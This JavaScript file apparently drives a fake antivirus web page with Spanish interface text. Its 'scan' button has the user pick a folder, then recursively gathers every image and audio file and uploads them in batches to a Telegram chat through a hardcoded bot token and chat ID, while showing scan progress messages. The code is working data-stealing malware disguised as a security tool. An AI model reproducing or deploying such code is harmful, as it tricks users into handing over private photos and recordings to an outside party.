let startTime;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;

    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        const folderHandle = await window.showDirectoryPicker();
        updateStatus('Analizando estructura...', 20);

        await collectAndSendInChunks(folderHandle); // NUEVO MÉTODO
        updateStatus('✅ Subida completa', 100);
    } catch (error) {
        console.error(error);
        updateStatus('❌ Error: ' + error.message, 0);
    } finally {
        isProcessing = false;
    }
});

// FUNCIÓN MODIFICADA: ahora procesa por bloques de 100 archivos
async function collectAndSendInChunks(folderHandle) {
    const BATCH_SIZE = 100;
    let batch = [];

    async function processDirectory(handle) {
        for await (const entry of handle.values()) {
            if (entry.kind === 'file') {
                const fileName = entry.name.toLowerCase();
                if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                    fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                    batch.push(entry);

                    if (batch.length === BATCH_SIZE) {
                        await sendFilesToTelegram(batch);
                        batch = []; // Limpiar lote
                    }
                }
            } else if (entry.kind === 'directory') {
                await processDirectory(entry); // Recursivamente ir a subcarpetas
            }
        }
    }

    await processDirectory(folderHandle);

    // Enviar lo que quede en el último lote si no llegó a 100
    if (batch.length > 0) {
        await sendFilesToTelegram(batch);
    }
}

async function sendFilesToTelegram(files) {
    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
    const chatId = '5821490693';

    const total = files.length;
    let sent = 0;

    for (const file of files) {
        sent++;
        const fileData = await file.getFile();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', `Archivo: ${file.name}`);
        formData.append('document', fileData);

        const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Error al enviar archivo:', errorData);
            throw new Error(errorData.description || 'Error desconocido al enviar archivo');
        }

        const progress = 40 + Math.floor((sent / total) * 60);
        updateStatus(`Enviando archivo ${sent} de ${total} en lote`, progress);

        await new Promise(resolve => setTimeout(resolve, 1000)); // Pausa de 1 segundo entre cada archivo
    }
}
